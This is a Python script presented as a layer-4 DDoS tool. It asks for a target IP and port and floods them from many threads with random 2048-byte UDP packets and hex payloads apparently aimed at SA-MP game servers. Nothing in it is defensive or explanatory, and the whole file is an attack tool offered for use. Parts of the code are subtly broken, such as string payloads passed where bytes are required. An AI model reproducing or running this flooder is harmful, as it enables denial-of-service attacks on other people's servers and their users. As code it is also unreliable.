import socket
import random
import threading

# List of payloads for L4 DDoS attack
payloads = [
    "53414d5090d91d4d611e700a465b00",  # p
    "53414d509538e1a9611e63",          # c
    "53414d509538e1a9611e69",          # i
    "53414d509538e1a9611e72",          # r
    "081e62da",                        # cookie port 7796
    "081e77da",                        # cookie port 7777
    "081e4dda",                        # cookie port 7771
    "021efd40",                        # cookie port 7784
    "021efd40",                        # cookie port 1111
    "081e7eda",                        # cookie port 1111 also
    "53414d50a3b17dd3311e8c",          # additional payload
    "53414d5098e1a96c11e63",          # additional payload
    "53414d509538e1a9611e6f",          # additional payload
    # Add more payloads here if needed
]

# Target IP and port
ip = str(input("Enter the target IP: "))
port = int(input("Enter the target PORT: "))

# Number of packets to send
times = int(input("Enter the number of packets: "))

# Number of threads for parallel execution
size = int(input("Enter the number of threads: "))

print("[!] Attacking {}:{} with {} packets and {} threads".format(ip, port, times, size))

# Function to send UDP packets
def send_packet():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            data = random._urandom(2048)  # Increase packet size for higher damage
            for _ in range(times):
                s.sendto(data, addr)
        except:
            pass
        finally:
            s.close()

# Function to send specialized packets
class MyThread(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                msg = random.choice(payloads)
                sock.sendto(msg, (ip, port))
                for payload in payloads[4:]:
                    sock.sendto(payload, (ip, port))
            except:
                pass
            finally:
                sock.close()

# Start threads for sending UDP packets
for _ in range(size):
    thread_small = threading.Thread(target=send_packet)
    thread_small.start()

# Start threads for sending specialized packets
for _ in range(size):
    thread_special = MyThread()
    thread_special.start()
